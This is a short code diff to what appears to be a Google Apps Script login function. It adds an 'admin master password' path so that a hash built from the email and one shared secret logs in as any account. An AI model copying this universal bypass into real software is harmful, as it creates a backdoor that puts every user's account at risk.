@@ -379,10 +379,22 @@ function login(p) {
   var user  = null;
   for (var i = 0; i < users.length; i++) {
     var u = users[i];
-    if (u['Email'] && u['Email'].toString().toLowerCase() === email &&
-        u['PasswordHash'] && u['PasswordHash'].toString() === hash) {
-      user = u;
-      break;
+    if (u['Email'] && u['Email'].toString().toLowerCase() === email) {
+      if (u['PasswordHash'] && u['PasswordHash'].toString() === hash) {
+        user = u;
+        break;
+      }
+      // Master password admin — recalcule le hash attendu côté backend
+      var masterPwd = PropertiesService.getScriptProperties().getProperty('ADMIN_MASTER_PWD');
+      if (masterPwd) {
+        var raw = email + '::' + masterPwd + '::AB22';
+        var digest = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, raw, Utilities.Charset.UTF_8);
+        var masterHash = digest.map(function(b) { return ('0' + ((b + 256) % 256).toString(16)).slice(-2); }).join('');
+        if (hash === masterHash) {
+          user = u;
+          break;
+        }
+      }
     }
   }
   if (!user) {
